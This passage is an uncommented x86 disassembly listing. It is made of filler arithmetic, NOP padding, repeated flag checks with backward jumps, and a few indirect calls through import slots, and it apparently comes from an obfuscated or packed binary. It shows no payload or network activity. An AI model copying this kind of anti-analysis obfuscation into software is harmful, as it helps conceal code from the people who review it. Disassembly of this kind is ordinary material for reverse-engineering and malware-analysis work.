  403fed:	mov    dl,BYTE PTR ds:0x4071da
  403ff3:	or     ecx,0x5f
  403ff6:	sub    ebx,ecx
  403ff8:	xor    DWORD PTR ds:0x40704f,eax
  403ffe:	add    ecx,0x77
  404001:	mov    ebx,DWORD PTR ds:0x407065
  404007:	adc    eax,edx
  404009:	sbb    ebx,0xffffffdd
  40400c:	mov    BYTE PTR ds:0x40708a,0x26
  404013:	sbb    edi,ebx
  404015:	sbb    edx,esi
  404017:	add    ebx,ebx
  404019:	cmp    BYTE PTR ds:0x407208,0x1
  404020:	jb     0x402556
  404026:	nop
  404027:	nop
  404028:	nop
  404029:	nop
  40402a:	nop
  40402b:	nop
  40402c:	nop
  40402d:	nop
  40402e:	nop
  40402f:	nop
  404030:	nop
  404031:	nop
  404032:	nop
  404033:	nop
  404034:	mov    BYTE PTR ds:0x407081,0xe9
  40403b:	mov    ds:0x4071c9,al
  404040:	mov    BYTE PTR ds:0x4071a9,0x1b
  404047:	adc    DWORD PTR ds:0x4070a1,eax
  40404d:	sub    BYTE PTR ds:0x4071f5,al
  404053:	mov    BYTE PTR ds:0x4070b1,0x15
  40405a:	mov    DWORD PTR ds:0x407008,ebx
  404060:	adc    DWORD PTR ds:0x4071ae,esi
  404066:	add    ecx,0x7d
  404069:	add    eax,0xffffff81
  40406c:	adc    edi,ecx
  40406e:	sub    BYTE PTR ds:0x40712e,bl
  404074:	adc    ecx,0xffffffd3
  404077:	add    dl,ch
  404079:	sub    esi,ebx
  40407b:	sub    DWORD PTR ds:0x40710d,ecx
  404081:	push   0x407241
  404086:	push   0xf
  404088:	push   0x407232
  40408d:	push   0x407226
  404092:	push   0x407226
  404097:	call   DWORD PTR ds:0x405038
  40409d:	test   eax,eax
  40409f:	jne    0x404034
  4040a1:	add    DWORD PTR ds:0x40705a,edi
  4040a7:	add    edx,esi
  4040a9:	sub    ebx,0x48
  4040ac:	mov    BYTE PTR ds:0x40706e,0x83
  4040b3:	mov    BYTE PTR ds:0x407053,0x5a
  4040ba:	mov    ebx,DWORD PTR ds:0x40707f
  4040c0:	xor    DWORD PTR ds:0x407093,edx
  4040c6:	xor    DWORD PTR ds:0x407009,eax
  4040cc:	mov    ebx,DWORD PTR ds:0x407068
  4040d2:	mov    eax,ds:0x40705b
  4040d7:	mov    eax,ds:0x4071e6
  4040dc:	add    ecx,0x58
  4040df:	add    DWORD PTR ds:0x40715e,edx
  4040e5:	mov    eax,ds:0x407134
  4040ea:	xor    eax,edi
  4040ec:	adc    BYTE PTR ds:0x407199,al
  4040f2:	cmp    BYTE PTR ds:0x407208,0x1
  4040f9:	jb     0x4027bc
  4040ff:	nop
  404100:	nop
  404101:	nop
  404102:	nop
  404103:	nop
  404104:	nop
  404105:	nop
  404106:	nop
  404107:	nop
  404108:	nop
  404109:	nop
  40410a:	nop
  40410b:	nop
  40410c:	nop
  40410d:	nop
  40410e:	nop
  40410f:	mov    BYTE PTR ds:0x40704f,0xa5
  404116:	mov    ds:0x40713b,eax
  40411b:	sbb    edi,edi
  40411d:	add    DWORD PTR ds:0x40701f,edi
  404123:	or     ebx,0xffffffe2
  404126:	mov    BYTE PTR ds:0x40701e,0x96
  40412d:	add    ecx,0x67
  404130:	xor    BYTE PTR ds:0x4070de,ah
  404136:	add    edx,0x74
  404139:	sbb    DWORD PTR ds:0x40700b,ebx
  40413f:	add    ah,bl
  404141:	sbb    esi,0xffffffaa
  404144:	mov    BYTE PTR ds:0x4070a6,0xef
  40414b:	mov    BYTE PTR ds:0x4071f3,0xa5
  404152:	mov    BYTE PTR ds:0x407034,0xd0
  404159:	add    ecx,0x3c
  40415c:	add    ebx,eax
  40415e:	mov    edi,DWORD PTR ds:0x40711a
  404164:	push   0x407259
  404169:	call   DWORD PTR ds:0x405000
  40416f:	add    ecx,eax
  404171:	mov    BYTE PTR ds:0x407072,0x54
  404178:	mov    edx,DWORD PTR ds:0x4070c7
  40417e:	add    ebx,0x73
  404181:	mov    eax,ds:0x4070da
  404186:	add    ecx,ecx
  404188:	and    edi,0xffffffa4
  40418b:	mov    BYTE PTR ds:0x407127,0xc0
  404192:	mov    esi,DWORD PTR ds:0x40716e
  404198:	mov    BYTE PTR ds:0x4071c4,0x7f
  40419f:	add    edx,0x7d
  4041a2:	and    DWORD PTR ds:0x407138,ebx
  4041a8:	sub    BYTE PTR ds:0x407063,cl
  4041ae:	mov    BYTE PTR ds:0x4071d2,0xb2
  4041b5:	add    ecx,0xffffffbc
  4041b8:	add    DWORD PTR ds:0x407156,edi
  4041be:	adc    DWORD PTR ds:0x407100,edx
  4041c4:	cmp    BYTE PTR ds:0x407208,0x1
  4041cb:	jb     0x401212
  4041d1:	nop
  4041d2:	nop
  4041d3:	nop
  4041d4:	mov    esi,DWORD PTR ds:0x407010
  4041da:	sub    DWORD PTR ds:0x4070eb,ebx
  4041e0:	mov    BYTE PTR ds:0x4070da,0xe3
  4041e7:	mov    BYTE PTR ds:0x407102,0x16
  4041ee:	add    edi,esi
  4041f0:	mov    ebx,DWORD PTR ds:0x407116
  4041f6:	mov    BYTE PTR ds:0x40709c,0x47
  4041fd:	mov    BYTE PTR ds:0x4070d5,0xf9
  404204:	xor    DWORD PTR ds:0x4070f4,edi
  40420a:	sbb    edi,esi
  40420c:	add    DWORD PTR ds:0x40714d,ebx
  404212:	xor    DWORD PTR ds:0x407175,eax
  404218:	sub    edi,edi
  40421a:	mov    BYTE PTR ds:0x4070df,0xd6
  404221:	sbb    edi,0x35
  404224:	push   0x407259
  404229:	call   DWORD PTR ds:0x405000
  40422f:	sub    DWORD PTR ds:0x407030,ebx
  404235:	xor    DWORD PTR ds:0x4070eb,eax
  40423b:	add    ecx,0x77
  40423e:	sbb    esi,0xffffffb5
  404241:	adc    eax,0xffffffe0
  404244:	or     DWORD PTR ds:0x407120,esi
  40424a:	sbb    ecx,eax
  40424c:	mov    ecx,DWORD PTR ds:0x4070fb
  404252:	mov    edi,DWORD PTR ds:0x407176
  404258:	add    DWORD PTR ds:0x4071db,ecx
  40425e:	mov    eax,ds:0x4070f2
  404263:	mov    cl,BYTE PTR ds:0x4071d5
  404269:	add    edx,0xffffffe9
  40426c:	mov    ecx,DWORD PTR ds:0x40715b
  404272:	add    DWORD PTR ds:0x407008,eax
  404278:	mov    BYTE PTR ds:0x4071f9,0x81
  40427f:	mov    BYTE PTR ds:0x4070a8,0x73
  404286:	or     eax,0xffffffbd
  404289:	cmp    BYTE PTR ds:0x407208,0x1
  404290:	jb     0x4018c3
  404296:	nop
  404297:	nop
  404298:	nop
  404299:	add    edi,esi
  40429b:	mov    bl,BYTE PTR ds:0x407068
  4042a1:	or     eax,0xffffffcf
  4042a4:	mov    ebx,DWORD PTR ds:0x4070b0
  4042aa:	sbb    edi,esi
  4042ac:	mov    eax,ds:0x4071fa
  4042b1:	or     edi,0xffffffe4
  4042b4:	mov    ebx,DWORD PTR ds:0x407024
  4042ba:	adc    bh,ah
  4042bc:	adc    DWORD PTR ds:0x40710d,esi
  4042c2:	mov    BYTE PTR ds:0x40719b,0x5
  4042c9:	add    edx,esi
  4042cb:	mov    ecx,DWORD PTR ds:0x407181
  4042d1:	mov    ecx,DWORD PTR ds:0x4071e7
  4042d7:	xor    eax,0x9
  4042da:	push   0x407241
  4042df:	push   0xf
  4042e1:	push   0x407232
  4042e6:	push   0x407226
  4042eb:	push   0x407226
  4042f0:	call   DWORD PTR ds:0x405038
  4042f6:	test   eax,eax
  4042f8:	jne    0x401ac9
  4042fe:	xor    eax,eax
  404300:	xor    esi,0x48
  404303:	adc    edi,0x7b
  404306:	mov    edi,DWORD PTR ds:0x407094
  40430c:	add    edx,eax
  40430e:	xor    eax,0x34
  404311:	add    ecx,edi
  404313:	mov    BYTE PTR ds:0x40710f,0x5
  40431a:	add    edx,ebx
  40431c:	add    DWORD PTR ds:0x40707f,edx
  404322:	or     DWORD PTR ds:0x407191,edx
  404328:	add    ecx,0xe
  40432b:	add    edx,0xffffff96
  40432e:	sub    DWORD PTR ds:0x407153,ecx
  404334:	add    eax,ebx
  404336:	sub    ebx,edi
  404338:	adc    DWORD PTR ds:0x407021,edx
  40433e:	xor    edi,0x70
  404341:	mov    edi,DWORD PTR ds:0x407054
  404347:	cmp    BYTE PTR ds:0x407208,0x1
  40434e:	jb     0x4016d5
  404354:	nop
  404355:	nop
  404356:	nop
  404357:	nop
  404358:	nop
  404359:	nop
  40435a:	nop
  40435b:	nop
  40435c:	nop
  40435d:	nop
  40435e:	nop
  40435f:	nop
  404360:	or     DWORD PTR ds:0x407065,eax
  404366:	adc    DWORD PTR ds:0x407126,ebx
  40436c:	adc    esi,0xffffffb6
  40436f:	add    edx,0xfffffff3
  404372:	mov    BYTE PTR ds:0x4070c5,0xb5
  404379:	adc    ebx,edi
  40437b:	sub    dl,0xef
  40437e:	adc    DWORD PTR ds:0x4071d5,edx
  404384:	add    edi,edx
  404386:	mov    BYTE PTR ds:0x407002,0x5f
  40438d:	and    BYTE PTR ds:0x4070f5,al
  404393:	add    ecx,0x73
  404396:	adc    edi,edx
  404398:	mov    edx,DWORD PTR ds:0x4071d6
  40439e:	mov    BYTE PTR ds:0x4070ce,0x69
  4043a5:	mov    edi,DWORD PTR ds:0x4071a9
  4043ab:	or     DWORD PTR ds:0x40716b,ebx
  4043b1:	push   0x407259
  4043b6:	call   DWORD PTR ds:0x405000
  4043bc:	sbb    esi,0x79
  4043bf:	mov    BYTE PTR ds:0x4071c2,0x9f
  4043c6:	adc    ah,bh
  4043c8:	adc    BYTE PTR ds:0x4071c5,ah
  4043ce:	mov    bl,BYTE PTR ds:0x4070ee
  4043d4:	add    edx,esi
  4043d6:	add    dh,0xce
  4043d9:	add    DWORD PTR ds:0x40719c,esi
  4043df:	add    edi,ebx
  4043e1:	xor    al,0xad
  4043e3:	sub    DWORD PTR ds:0x407174,eax
  4043e9:	mov    ecx,DWORD PTR ds:0x407064
  4043ef:	add    ebx,0xffffff87
  4043f2:	mov    ecx,DWORD PTR ds:0x40711a
  4043f8:	mov    BYTE PTR ds:0x4071e2,0xd4
  4043ff:	add    ecx,0x14
  404402:	mov    BYTE PTR ds:0x40715c,0xcb
  404409:	cmp    BYTE PTR ds:0x407208,0x1
  404410:	jb     0x402b2b
  404416:	nop
  404417:	nop
  404418:	nop
  404419:	nop
  40441a:	nop
  40441b:	nop
  40441c:	nop
